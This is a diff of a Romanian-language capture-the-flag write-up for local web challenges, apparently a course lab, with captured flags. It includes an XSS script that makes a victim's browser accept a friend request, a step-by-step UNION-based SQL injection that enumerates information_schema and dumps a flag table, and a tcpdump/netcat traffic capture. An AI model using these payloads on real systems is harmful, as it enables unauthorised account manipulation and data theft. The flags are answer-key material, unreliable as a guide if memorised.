@@ -11,6 +11,7 @@ http://localhost:8080 (pt browser)
 -> cand am dat pe pagina de register si am descarcat o am gasit adevaratul link spre pagina de register care era /auth/register_real_one/ 
 -> am intrat, mi am facut cont, m am logat
 -> am descarcat apoi pagina noua http://localhost:8080/inside si acolo am gasit flagul
+-> la fiecare reconectare am o noua adresa ip dupa cum este precizat si in enunt
 
 SpeishFlag{KULO8eXmn49ooxdPh0AbKIOU0Yvy5Fbs}
 
@@ -19,7 +20,6 @@ TASK2
 
 M-am uitat pe toate sursele html si js si am gasit pagina main.js pentru profilul de home unde se gasesc 3 functii printre care si cea pentru a adauga un prieten si a accepta o cerere, deci am dedus ca trebuie sa folosesc functia de accept. In pagina bossului am gasit div class="box profile-view" data-user-id="1">, 1 fiind id-ul bossului, apoi am vrut sa vad ce id are profilul creat de mine, student, si am descoperit id-ul 9 prin incercarea paginilor la rand.
 Hintul sugera ca trebuie sa ma folosesc de un prieten comun, acesta fiind Kat Nyan, prieten comun intre mine si boss, astfel initiez atacul dandu-i acestuia mesaj cu urmatorul script:
-
 <script>
 $(function() {
     if (window.authUserName == 'nyan') {
@@ -35,7 +35,6 @@ $(function() {
     }
 });
 </script>
-
 Dupa ce am devenit prieten cu boss-ul am descarcat pagina bossului si acolo am dat de flag. Se gasea de asemenea direct in browser in una din postarile bossului.
 
 SpeishFlag{TtZ64kxkwLxWy8BEGj7hmSTkhysUlIg3}
@@ -52,14 +51,23 @@ SpeishFlag{vxXRwH1eD9l9OIsjWoMNsTFq1jdsqniD}
 
 TASK4
 
-Incep prin a afla numarul de coloane al bazei de date si incerc comanda la rand pana vad ca la 9 primesc eroare, ' or 1 order by 1,2,3,4,5,6,7,8 -- x. Dau apoi comanda 
-' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 FROM information_schema.tables -- x  si rezulta coloana  3's Profile. 3 din comada se inlocuieste cu group_concat(distinct(table_schema) separator ','), care ma face sa gasesc schema, in cazul meu information_schema,performance_schema,web_4169's Profile. Ma folosesc de asta si dau ' UNION SELECT 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.tables where table_schema='web_4169' -- x.  Asa am ajuns la : accounts,flags53929,friends,messages,posts's Profile 6.
-Flag-ul se afla in tabela flags53929, asa ca am creat urmatoarea cerere:' UNION SELECT 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.columns where table_schema='web_4169' and table_name='flags53929'-- x
-Cele 2 coloane la care am ajuns apoi au fost : id,zaflag's Profile 6. 
-Am aflat flag-ul prin aceasta ultima cerere: 
-' UNION SELECT 1, 2, zaflag, 4, 5, 6, 7, 8 FROM web_4169.flags53929-- x
+Incep prin a afla numarul de coloane al bazei de date si incerc comanda la rand pana vad ca la 9 primesc eroare, ' or 1 order by 1,2,3,4,5,6,7,8 -- x. Dau apoi comanda ' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 FROM information_schema.tables -- x  si rezulta coloana  3's Profile. 3 din comada se inlocuieste cu group_concat(distinct(table_schema) separator ','), care ma face sa gasesc schema, in cazul meu information_schema,performance_schema,web_4169's Profile. Ma folosesc de asta si dau ' UNION SELECT 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.tables where table_schema='web_4169' -- x.  Asa am ajuns la : accounts,flags53929,friends,messages,posts's Profile 6.
+Flag-ul se afla in tabela flags53929, asa ca am creat urmatoarea cerere:
+    ' UNION SELECT 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.columns where table_schema='web_4169' and table_name='flags53929'-- x
+   Cele 2 coloane la care am ajuns apoi au fost : id,zaflag's Profile 6. 
+   Am aflat flag-ul prin aceasta ultima cerere: 
+    ' UNION SELECT 1, 2, zaflag, 4, 5, 6, 7, 8 FROM web_4169.flags53929-- x
+
 
 SpeishFlag{T0NP1QZJ6Nugu6BO7dKMcgY4RsPuCpEM}
+
+
+
+TASK5
+Am inceput sa monitorizez traficul de internet folosind tcpdump -i eth0 host adresa_ip_server and 80 si am observat mesaje cu Destination Unreachable de genul 09:28:56.473210 IP dev-machine > 192.168.112.113: ICMP dev-machine udp port 10383 unreachable, length 136. Am dat nc -lu 10383 adica portul indentificat mai sus si am obtinut urmatorul mesaj codat: NYAN.NYAN.NYAN.NYAN.NYAN.U3BlaXNoRmxhZ3tSTE9BSGVRcHprMGpZd29IU1FjZWxJbWhhNWI4bUNaSX0=NYAN.NYAN.NYAN.NYAN.NYAN.
+M-am gandit ca trebuie sa il decodez cumva asa ca am incercat base64 si am obtinut flagul.
+
+SpeishFlag{RLOAHeQpzk0jYwoHSQcelImha5b8mCZI}
 
 
 
